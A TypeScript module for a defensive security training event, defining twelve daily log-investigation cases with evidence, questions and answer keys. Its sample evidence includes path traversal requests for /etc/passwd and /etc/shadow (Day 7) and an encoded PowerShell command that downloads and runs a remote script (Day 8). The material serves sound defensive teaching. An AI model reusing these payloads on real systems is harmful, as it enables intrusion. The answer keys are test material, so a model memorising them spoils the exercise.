// The yearly free event: one short investigation unlocks each day, with its own leaderboard.
// Days are ordinary investigation cases, so the case page, grading and progress storage are reused.
// This module contains answers. The server grades with it; the web app only loads it in the mock demo build.
import type { InvestigationCase } from './cases.js';

export type AnnualEvent = {
  slug: string;
  title: string;
  summary: string;
  /** First unlock, YYYY-MM-DD, 00:00 UTC. Day n unlocks n - 1 days later. */
  startsOn: string;
  /** Solves count for the leaderboard until this many days after startsOn. */
  scoringDays: number;
  days: InvestigationCase[];
};

const DAY_MS = 24 * 60 * 60 * 1000;

export function eventSchedule(event: Pick<AnnualEvent, 'days' | 'scoringDays'>, startsOn: string, now: Date) {
  const start = Date.parse(`${startsOn}T00:00:00Z`);
  const closesAt = new Date(start + event.scoringDays * DAY_MS).toISOString();
  const days = event.days.map((item, index) => {
    const unlocksAt = new Date(start + index * DAY_MS);
    return { day: index + 1, slug: item.slug, unlocksAt: unlocksAt.toISOString(), unlocked: now.getTime() >= unlocksAt.getTime() };
  });
  const status: 'upcoming' | 'live' | 'closed' = now.getTime() < start ? 'upcoming' : now.toISOString() < closesAt ? 'live' : 'closed';
  return { startsAt: new Date(start).toISOString(), closesAt, status, days };
}

/** Event day by slug, only once it has unlocked. */
export function findUnlockedEventDay(event: AnnualEvent, startsOn: string, slug: string, now: Date) {
  const index = event.days.findIndex((item) => item.slug === slug);
  if (index < 0) return null;
  return eventSchedule(event, startsOn, now).days[index].unlocked ? event.days[index] : null;
}

export const annualEvent: AnnualEvent = {
  slug: 'twelve-days-2026',
  title: '12 Days of Defense 2026',
  summary: 'A new bite-sized investigation unlocks every day from 1 December. Solve them to climb the event leaderboard. Free for everyone.',
  startsOn: '2026-12-01',
  scoringDays: 14,
  days: [
    {
      slug: 'event-2026-d01',
      title: 'Day 1: Knock knock on the jump host',
      summary: 'A burst of SSH failures, then one success.',
      story: 'The overnight shift forwarded the SSH log from the jump host. Someone tried many accounts in a few seconds. Find out who got in.',
      category: 'Authentication',
      difficulty: 'beginner',
      estimatedMinutes: 5,
      skills: ['Log reading', 'Brute force'],
      evidence: [{
        id: 'jump01-auth',
        name: 'jump01-auth.log',
        kind: 'log',
        description: 'sshd entries from jump01.',
        content: `Dec  1 06:01:12 jump01 sshd[2101]: Failed password for admin from 203.0.113.77 port 51022 ssh2
Dec  1 06:01:14 jump01 sshd[2102]: Failed password for root from 203.0.113.77 port 51030 ssh2
Dec  1 06:01:15 jump01 sshd[2103]: Failed password for oracle from 203.0.113.77 port 51034 ssh2
Dec  1 06:01:17 jump01 sshd[2104]: Failed password for test from 203.0.113.77 port 51040 ssh2
Dec  1 06:01:19 jump01 sshd[2105]: Failed password for deploy from 203.0.113.77 port 51044 ssh2
Dec  1 06:01:21 jump01 sshd[2106]: Accepted password for deploy from 203.0.113.77 port 51046 ssh2
Dec  1 06:02:40 jump01 sshd[2110]: Failed password for nadia from 192.168.10.25 port 50208 ssh2
Dec  1 06:02:44 jump01 sshd[2112]: Accepted publickey for nadia from 192.168.10.25 port 50210 ssh2`
      }],
      questions: [
        { id: 'ip', prompt: 'Which IP address tried many accounts and then got in?', format: 'IPv4 address', hint: 'Look for one source with failures on several different usernames.', answers: ['203.0.113.77'], explanation: '203.0.113.77 failed on admin, root, oracle, test and deploy within seconds, then logged in as deploy.', points: 10 },
        { id: 'account', prompt: 'Which account did that IP log in to?', format: 'Username', hint: 'Find the "Accepted" line for the same IP.', answers: ['deploy'], explanation: 'The deploy account accepted a password from 203.0.113.77 at 06:01:21.', points: 10 },
        { id: 'nadia', prompt: 'Is the activity from 192.168.10.25 part of the attack?', format: 'Pick one', hint: 'Compare the auth method and the source network.', options: ['Yes, it is the same attacker', 'No, it looks like a normal user with a mistyped password'], answers: ['No, it looks like a normal user with a mistyped password'], explanation: 'One typo from an internal address, followed by a key-based login, is ordinary user behaviour.', points: 5 }
      ],
      debrief: 'A password-guessing burst found a weak password on the deploy account. Reset it, move the jump host to key-only logins, and check what deploy did after 06:01:21.'
    },
    {
      slug: 'event-2026-d02',
      title: 'Day 2: The urgent parcel',
      summary: 'A customs fee email with headers that do not add up.',
      story: 'Lena from finance reported this email before clicking anything. Read the headers and tell her what is wrong with it.',
      category: 'Phishing',
      difficulty: 'beginner',
      estimatedMinutes: 5,
      skills: ['Email headers', 'SPF'],
      evidence: [{
        id: 'parcel-email',
        name: 'parcel.eml',
        kind: 'email',
        description: 'The reported email with its headers.',
        content: `Received: from mail.parcel-desk.example (198.51.100.200) by mx.northwind.example
Received-SPF: fail (northwind.example: domain of parcel-desk.example does not designate 198.51.100.200 as permitted sender)
Authentication-Results: mx.northwind.example; spf=fail smtp.mailfrom=parcel-desk.example; dkim=none; dmarc=fail
From: "Parcel Desk" <notify@parcel-desk.example>
Reply-To: claims@quick-refund.test
To: lena.k@northwind.example
Subject: Action needed: parcel held at customs

Your parcel is held at customs. Pay the 1.99 fee within 12 hours or it will be returned:
http://parcel-desk.example.quick-refund.test/pay`
      }],
      questions: [
        { id: 'reply', prompt: 'Which domain would receive Lena\'s reply?', format: 'Domain name', hint: 'Replies go to Reply-To, not From.', answers: ['quick-refund.test'], explanation: 'Reply-To points at quick-refund.test, a different domain from the sender.', points: 10 },
        { id: 'ip', prompt: 'Which IP address actually delivered the email?', format: 'IPv4 address', hint: 'Check the Received line.', answers: ['198.51.100.200'], explanation: '198.51.100.200 delivered it, and SPF says that server may not send for parcel-desk.example.', points: 10 },
        { id: 'link', prompt: 'Which domain does the payment link really go to?', format: 'Pick one', hint: 'Read a hostname from right to left.', options: ['parcel-desk.example', 'quick-refund.test', 'northwind.example'], answers: ['quick-refund.test'], explanation: 'The hostname ends in quick-refund.test. "parcel-desk.example" is only a subdomain label.', points: 5 }
      ],
      debrief: 'Failed SPF and DMARC, a mismatched Reply-To, a deadline and a disguised link: classic fee phishing. Thank Lena, block the domain, and search for other recipients.'
    },
    {
      slug: 'event-2026-d03',
      title: 'Day 3: Locked out before coffee',
      summary: 'A lockout alert at 07:58. Attack or Monday morning?',
      story: 'The SIEM raised an account lockout for j.ortiz. Decide if this needs an incident or just a friendly note.',
      category: 'Authentication',
      difficulty: 'beginner',
      estimatedMinutes: 5,
      skills: ['Windows events', 'Triage'],
      evidence: [{
        id: 'lockout-csv',
        name: 'logon-events.csv',
        kind: 'csv',
        description: 'Windows security events for j.ortiz.',
        content: `time,event_id,account,source_host,detail
2026-12-03T07:58:01Z,4625,j.ortiz,WS-114,bad password
2026-12-03T07:58:09Z,4625,j.ortiz,WS-114,bad password
2026-12-03T07:58:15Z,4625,j.ortiz,WS-114,bad password
2026-12-03T07:58:22Z,4625,j.ortiz,WS-114,bad password
2026-12-03T07:58:30Z,4625,j.ortiz,WS-114,bad password
2026-12-03T07:58:30Z,4740,j.ortiz,DC-01,account locked out
2026-12-03T08:15:44Z,4767,j.ortiz,DC-01,account unlocked by helpdesk.amy
2026-12-03T08:16:02Z,4624,j.ortiz,WS-114,logon success`
      }],
      questions: [
        { id: 'fails', prompt: 'How many failed logons happened before the lockout?', format: 'Number', hint: 'Count event 4625.', answers: ['5'], explanation: 'Five 4625 events, then the 4740 lockout.', points: 10 },
        { id: 'unlock', prompt: 'Which account unlocked j.ortiz?', format: 'Username', hint: 'Event 4767 records the unlock.', answers: ['helpdesk.amy'], explanation: 'helpdesk.amy unlocked the account at 08:15:44.', points: 10 },
        { id: 'verdict', prompt: 'What is the most likely verdict?', format: 'Pick one', hint: 'Where did the failures come from, and what happened after the unlock?', options: ['Password attack from outside', 'User forgot a new password on their own workstation'], answers: ['User forgot a new password on their own workstation'], explanation: 'Every failure came from the user\'s own workstation, followed by a helpdesk unlock and a normal logon.', points: 5 }
      ],
      debrief: 'Not every alert is an attack. All failures came from WS-114, the user\'s own machine, and the helpdesk resolved it. Close as benign and note it.'
    },
    {
      slug: 'event-2026-d04',
      title: 'Day 4: Uploads at lunch',
      summary: 'Someone posted a very large file to a paste site.',
      story: 'The proxy flagged an unusual upload around noon. Find the host and the destination.',
      category: 'Network',
      difficulty: 'beginner',
      estimatedMinutes: 6,
      skills: ['Proxy logs', 'Data loss'],
      evidence: [{
        id: 'proxy',
        name: 'proxy.log',
        kind: 'log',
        description: 'Web proxy, 12:00 to 12:10 UTC.',
        content: `2026-12-04T12:01:10Z 10.20.4.31 GET https://intranet.northwind.example/menu 200 bytes_out=512 bytes_in=20480
2026-12-04T12:03:44Z 10.20.4.31 GET https://news.example/today 200 bytes_out=640 bytes_in=88412
2026-12-04T12:05:02Z 10.20.4.18 POST https://files.paste-drop.test/upload 200 bytes_out=48211904 bytes_in=310
2026-12-04T12:05:40Z 10.20.4.18 POST https://files.paste-drop.test/upload 200 bytes_out=1204 bytes_in=290
2026-12-04T12:06:12Z 10.20.4.22 GET https://cdn.example/lib.js 200 bytes_out=420 bytes_in=120034
2026-12-04T12:08:55Z 10.20.4.31 GET https://intranet.northwind.example/hr 200 bytes_out=530 bytes_in=18001`
      }],
      questions: [
        { id: 'host', prompt: 'Which internal host sent the large upload?', format: 'IPv4 address', hint: 'Compare bytes_out across lines.', answers: ['10.20.4.18'], explanation: '10.20.4.18 sent about 48 MB in one POST.', points: 10 },
        { id: 'dest', prompt: 'Which hostname received it?', format: 'Hostname', hint: 'Look at the URL of that POST.', answers: ['files.paste-drop.test', 'paste-drop.test'], explanation: 'The upload went to files.paste-drop.test, a file-sharing site.', points: 10 }
      ],
      debrief: 'A 48 MB upload to a paste site is a likely data leak. Identify the user on 10.20.4.18, ask what was uploaded, and block the site if policy allows.'
    },
    {
      slug: 'event-2026-d05',
      title: 'Day 5: Very long names',
      summary: 'DNS queries that look like someone is smuggling data.',
      story: 'The DNS resolver logged odd TXT lookups at 2am. Work out who sent them and where they were going.',
      category: 'Network',
      difficulty: 'intermediate',
      estimatedMinutes: 6,
      skills: ['DNS', 'Exfiltration'],
      evidence: [{
        id: 'dns',
        name: 'dns-queries.log',
        kind: 'log',
        description: 'Internal resolver query log.',
        content: `2026-12-05T02:11:01Z client=10.20.7.9 query=aGVsbG8gZnJvbS.t1.cdn-sync.test type=TXT
2026-12-05T02:11:02Z client=10.20.7.9 query=IHRoZSBmaW5hbmNl.t1.cdn-sync.test type=TXT
2026-12-05T02:11:03Z client=10.20.7.9 query=IHNoYXJlIGRyaXZl.t1.cdn-sync.test type=TXT
2026-12-05T02:11:05Z client=10.20.7.12 query=www.northwind.example type=A
2026-12-05T02:11:06Z client=10.20.7.9 query=LiBwYXlyb2xsLmNzdg.t1.cdn-sync.test type=TXT
2026-12-05T02:11:09Z client=10.20.7.15 query=mail.northwind.example type=MX`
      }],
      questions: [
        { id: 'client', prompt: 'Which client sent the suspicious queries?', format: 'IPv4 address', hint: 'Look for random-looking first labels.', answers: ['10.20.7.9'], explanation: '10.20.7.9 sent every random-looking query.', points: 10 },
        { id: 'domain', prompt: 'Which domain receives the data?', format: 'Domain name', hint: 'The data is in the first label. The domain is what stays the same.', answers: ['cdn-sync.test', 't1.cdn-sync.test'], explanation: 'Every query ends in t1.cdn-sync.test, so that domain\'s name server collects the data.', points: 10 },
        { id: 'type', prompt: 'Which record type did the suspicious queries use?', format: 'DNS record type', hint: 'It is at the end of each line.', answers: ['TXT'], explanation: 'TXT records can carry replies, which makes them popular for DNS tunnelling.', points: 5 }
      ],
      debrief: 'Encoded chunks in subdomains, a single client and odd hours point to DNS tunnelling. Isolate 10.20.7.9 and block cdn-sync.test at the resolver.'
    },
    {
      slug: 'event-2026-d06',
      title: 'Day 6: Who turned off the cameras',
      summary: 'Cloud audit logging stopped on a Saturday night.',
      story: 'The cloud audit trail went quiet at 21:43. The last events before the gap are below.',
      category: 'Cloud',
      difficulty: 'intermediate',
      estimatedMinutes: 6,
      skills: ['Cloud audit logs', 'Defense evasion'],
      evidence: [{
        id: 'trail',
        name: 'audit-trail.jsonl',
        kind: 'json',
        description: 'Cloud API events, one per line.',
        content: `{"eventTime":"2026-12-06T21:40:02Z","eventName":"ConsoleLogin","userIdentity":{"userName":"ops-temp"},"sourceIPAddress":"198.51.100.61","responseElements":{"ConsoleLogin":"Success"}}
{"eventTime":"2026-12-06T21:42:17Z","eventName":"ListTrails","userIdentity":{"userName":"ops-temp"},"sourceIPAddress":"198.51.100.61"}
{"eventTime":"2026-12-06T21:43:05Z","eventName":"StopLogging","userIdentity":{"userName":"ops-temp"},"sourceIPAddress":"198.51.100.61","requestParameters":{"name":"org-audit-trail"}}
{"eventTime":"2026-12-06T21:44:30Z","eventName":"CreateAccessKey","userIdentity":{"userName":"ops-temp"},"sourceIPAddress":"198.51.100.61","requestParameters":{"userName":"backup-svc"}}`
      }],
      questions: [
        { id: 'call', prompt: 'Which API call turned off audit logging?', format: 'API call name', hint: 'Read the eventName values in order.', answers: ['StopLogging'], explanation: 'StopLogging on org-audit-trail at 21:43:05.', points: 10 },
        { id: 'key', prompt: 'Which user received a new access key right after?', format: 'Username', hint: 'Check requestParameters on the last event.', answers: ['backup-svc'], explanation: 'ops-temp created an access key for backup-svc, likely to keep access later.', points: 10 }
      ],
      debrief: 'Turning off logging and then creating a key for another user is a common way to hide and stay. Restart the trail, disable the new backup-svc key and ops-temp, and review what happened during the gap.'
    },
    {
      slug: 'event-2026-d07',
      title: 'Day 7: Dot dot slash',
      summary: 'A download page that serves more than downloads.',
      story: 'The web team saw odd file names in the download endpoint. Check whether anything sensitive was served.',
      category: 'Web',
      difficulty: 'intermediate',
      estimatedMinutes: 6,
      skills: ['Web logs', 'Path traversal'],
      evidence: [{
        id: 'access',
        name: 'access.log',
        kind: 'log',
        description: 'Web server access log.',
        content: `198.51.100.90 - - [07/Dec/2026:10:12:01 +0000] "GET /download?file=report.pdf HTTP/1.1" 200 20311
198.51.100.90 - - [07/Dec/2026:10:12:09 +0000] "GET /download?file=../app.config HTTP/1.1" 403 12
198.51.100.90 - - [07/Dec/2026:10:12:15 +0000] "GET /download?file=..%2f..%2fetc%2fpasswd HTTP/1.1" 200 1842
198.51.100.90 - - [07/Dec/2026:10:12:30 +0000] "GET /download?file=..%2f..%2fetc%2fshadow HTTP/1.1" 403 12
192.168.1.40 - - [07/Dec/2026:10:13:00 +0000] "GET /download?file=menu.pdf HTTP/1.1" 200 9001`
      }],
      questions: [
        { id: 'file', prompt: 'Which system file did the server actually return?', format: 'File path', hint: 'Find the traversal request with status 200.', answers: ['/etc/passwd', 'etc/passwd', 'passwd'], explanation: 'The %2f-encoded request for /etc/passwd returned 200 and 1842 bytes.', points: 10 },
        { id: 'encoding', prompt: 'How did the attacker get past the filter?', format: 'Pick one', hint: 'Compare the blocked request with the successful one.', options: ['URL encoding the slashes', 'Base64 encoding the path', 'Using a different HTTP method'], answers: ['URL encoding the slashes'], explanation: '"../" was blocked, but "..%2f" was decoded after the filter ran.', points: 10 }
      ],
      debrief: 'The filter checked for "../" before decoding. Decode first, then resolve the path and make sure it stays inside the download folder.'
    },
    {
      slug: 'event-2026-d08',
      title: 'Day 8: Encoded intentions',
      summary: 'Word starts a hidden PowerShell with a long encoded command.',
      story: 'EDR caught a process chain on WS-207. Decode the command and find where it reaches out to. Tip: the terminal tab can decode it.',
      category: 'Endpoint',
      difficulty: 'intermediate',
      estimatedMinutes: 8,
      skills: ['Process trees', 'Base64'],
      evidence: [{
        id: 'process',
        name: 'process.csv',
        kind: 'csv',
        description: 'Process creation events from WS-207.',
        content: `time,host,parent,process,command_line
2026-12-08T09:30:11Z,WS-207,outlook.exe,winword.exe,"winword.exe /n invoice_Dec.docm"
2026-12-08T09:30:19Z,WS-207,winword.exe,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADMAMwAvAGEALgBwAHMAMQAnACkA"`
      }, {
        id: 'encoded',
        name: 'encoded.txt',
        kind: 'text',
        description: 'The -enc value on its own, ready to decode.',
        content: 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADMAMwAvAGEALgBwAHMAMQAnACkA'
      }],
      questions: [
        { id: 'parent', prompt: 'Which process started PowerShell?', format: 'Process name', hint: 'Check the parent column.', answers: ['winword.exe', 'winword'], explanation: 'winword.exe, opened from an email attachment, started PowerShell.', points: 10 },
        { id: 'ip', prompt: 'Which IP address does the decoded command download from?', format: 'IPv4 address', hint: 'In the terminal: cat encoded.txt | base64 -d | iconv -f utf-16le', answers: ['198.51.100.33'], explanation: 'The command runs IEX on a script downloaded from http://198.51.100.33/a.ps1.', points: 15 }
      ],
      debrief: 'A macro document started hidden PowerShell that downloaded and ran a script. Isolate WS-207, block 198.51.100.33, and search for invoice_Dec.docm in other mailboxes.'
    },
    {
      slug: 'event-2026-d09',
      title: 'Day 9: Knocking on every door',
      summary: 'One outside address tried port after port.',
      story: 'The firewall logged a quick series of connection attempts to the file server at 3am.',
      category: 'Network',
      difficulty: 'beginner',
      estimatedMinutes: 6,
      skills: ['Firewall logs', 'Port scans'],
      evidence: [{
        id: 'fw',
        name: 'firewall.log',
        kind: 'log',
        description: 'Perimeter firewall decisions.',
        content: `2026-12-09T03:00:01Z DENY TCP 203.0.113.50:41000 -> 10.0.5.10:21
2026-12-09T03:00:01Z DENY TCP 203.0.113.50:41001 -> 10.0.5.10:23
2026-12-09T03:00:02Z DENY TCP 203.0.113.50:41002 -> 10.0.5.10:25
2026-12-09T03:00:02Z DENY TCP 203.0.113.50:41003 -> 10.0.5.10:110
2026-12-09T03:00:03Z DENY TCP 203.0.113.50:41004 -> 10.0.5.10:139
2026-12-09T03:00:03Z ALLOW TCP 203.0.113.50:41005 -> 10.0.5.10:443
2026-12-09T03:00:04Z DENY TCP 203.0.113.50:41006 -> 10.0.5.10:445
2026-12-09T03:00:04Z DENY TCP 203.0.113.50:41007 -> 10.0.5.10:3389
2026-12-09T03:00:05Z DENY TCP 203.0.113.50:41008 -> 10.0.5.10:8080
2026-12-09T03:05:00Z ALLOW TCP 198.51.100.7:52000 -> 10.0.5.10:443`
      }],
      questions: [
        { id: 'ports', prompt: 'How many different ports did 203.0.113.50 try?', format: 'Number', hint: "grep 203.0.113.50 firewall.log | wc -l", answers: ['9'], explanation: 'Nine ports in five seconds: 21, 23, 25, 110, 139, 443, 445, 3389 and 8080.', points: 10 },
        { id: 'open', prompt: 'Which port was allowed through?', format: 'Port number', hint: 'Look for ALLOW from the scanning address.', answers: ['443'], explanation: 'Only 443 was allowed, which is expected for a server that publishes HTTPS.', points: 10 }
      ],
      debrief: 'A fast scan that only reached the intended HTTPS port. Make sure the service on 443 is patched, and consider rate-limiting new connections per source.'
    },
    {
      slug: 'event-2026-d10',
      title: 'Day 10: Who clicked?',
      summary: 'Results from the company\'s own phishing awareness test.',
      story: 'Security ran an approved phishing simulation. Read the results and pick who needs follow-up first.',
      category: 'Phishing',
      difficulty: 'beginner',
      estimatedMinutes: 5,
      skills: ['Awareness metrics', 'CSV'],
      evidence: [{
        id: 'sim',
        name: 'simulation-results.csv',
        kind: 'csv',
        description: 'One row per employee in the test group.',
        content: `user,delivered,opened,clicked,submitted_credentials,reported
a.chen,yes,yes,no,no,yes
b.ivanova,yes,yes,yes,no,no
c.mendes,yes,no,no,no,no
d.karimov,yes,yes,yes,yes,no
e.novak,yes,yes,no,no,yes
f.osei,yes,yes,yes,no,yes`
      }],
      questions: [
        { id: 'clicked', prompt: 'How many people clicked the link?', format: 'Number', hint: 'Count "yes" in the clicked column.', answers: ['3'], explanation: 'b.ivanova, d.karimov and f.osei clicked.', points: 10 },
        { id: 'creds', prompt: 'Who entered a password and needs a reset conversation first?', format: 'Username', hint: 'Check submitted_credentials.', answers: ['d.karimov'], explanation: 'Only d.karimov submitted credentials. In a real attack that password would be compromised.', points: 10 },
        { id: 'reported', prompt: 'How many people reported the email?', format: 'Number', hint: 'Count "yes" in the reported column.', answers: ['3'], explanation: 'a.chen, e.novak and f.osei reported it. f.osei clicked and then reported, which is still a good outcome.', points: 5 }
      ],
      debrief: 'Measure reports as well as clicks. Fast reporting lets the SOC pull an email before more people fall for it. Follow up kindly, not with blame.'
    },
    {
      slug: 'event-2026-d11',
      title: 'Day 11: It came back after reboot',
      summary: 'Something restarts on every login.',
      story: 'Mira\'s laptop keeps launching an unknown program at login. Compare the startup entries with the file signatures.',
      category: 'Endpoint',
      difficulty: 'intermediate',
      estimatedMinutes: 6,
      skills: ['Persistence', 'Registry'],
      evidence: [{
        id: 'run',
        name: 'run-key.reg',
        kind: 'text',
        description: 'Export of the user Run key.',
        content: `[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"OneDrive"="C:\\Users\\mira\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background"
"SyncHelper"="C:\\Users\\mira\\AppData\\Roaming\\synchelper\\sh.exe -silent"
"Teams"="C:\\Users\\mira\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart Teams.exe"`
      }, {
        id: 'sigs',
        name: 'signatures.csv',
        kind: 'csv',
        description: 'Signature check of each startup file.',
        content: `file,signed,publisher,created
OneDrive.exe,yes,Microsoft Corporation,2025-03-02
sh.exe,no,,2026-12-10
Update.exe,yes,Microsoft Corporation,2025-06-11`
      }],
      questions: [
        { id: 'value', prompt: 'Which Run key value is suspicious?', format: 'Registry value name', hint: 'Match each entry to its signature row.', answers: ['SyncHelper'], explanation: 'SyncHelper starts an unsigned sh.exe from AppData\\Roaming.', points: 10 },
        { id: 'date', prompt: 'On what date was that file created?', format: 'YYYY-MM-DD', hint: 'See signatures.csv.', answers: ['2026-12-10'], explanation: 'sh.exe appeared on 2026-12-10, which gives you a starting point for the timeline.', points: 10 }
      ],
      debrief: 'An unsigned program in Roaming with a harmless-sounding name is a common persistence trick. Remove the Run value, quarantine sh.exe, and find out how it arrived on 2026-12-10.'
    },
    {
      slug: 'event-2026-d12',
      title: 'Day 12: Write the timeline',
      summary: 'Put the pieces together and choose the first response.',
      story: 'This final day joins everything you practised. Read the timeline of one incident and decide what to do first.',
      category: 'Endpoint',
      difficulty: 'intermediate',
      estimatedMinutes: 8,
      skills: ['Timelines', 'Containment'],
      evidence: [{
        id: 'timeline',
        name: 'timeline.txt',
        kind: 'text',
        description: 'Events collected from mail, EDR and the network.',
        content: `2026-12-12T08:02Z  mail gateway   invoice_Dec.docm delivered to p.lindqvist
2026-12-12T08:09Z  WS-311         winword.exe started powershell.exe -enc ...
2026-12-12T08:09Z  WS-311         download from 198.51.100.33/a.ps1
2026-12-12T08:15Z  WS-311         Run key value "SyncHelper" created
2026-12-12T08:40Z  WS-311         SMB connections to 10.0.5.20, 10.0.5.21, 10.0.5.22
2026-12-12T08:52Z  EDR            alert raised, analyst paged`
      }],
      questions: [
        { id: 'host', prompt: 'Which host was compromised first?', format: 'Hostname', hint: 'Where did the attachment run?', answers: ['WS-311'], explanation: 'WS-311 opened the attachment and ran the payload.', points: 10 },
        { id: 'minutes', prompt: 'How many minutes passed between delivery and the alert?', format: 'Number', hint: '08:02 to 08:52.', answers: ['50'], explanation: '50 minutes. Faster reporting or detection would shrink this window.', points: 10 },
        { id: 'contain', prompt: 'What should happen first?', format: 'Pick one', hint: 'The attacker is already reaching other servers over SMB.', options: ['Isolate WS-311 from the network', 'Reinstall the mail server', 'Email the attacker\'s IP owner and wait', 'Close the alert because the user is trusted'], answers: ['Isolate WS-311 from the network'], explanation: 'Isolating WS-311 stops lateral movement while you collect evidence and check the three servers.', points: 10 }
      ],
      debrief: 'Delivery, execution, download, persistence, lateral movement. Contain the first host, then scope the servers it touched. You finished the 12 days. Well done.'
    }
  ]
};
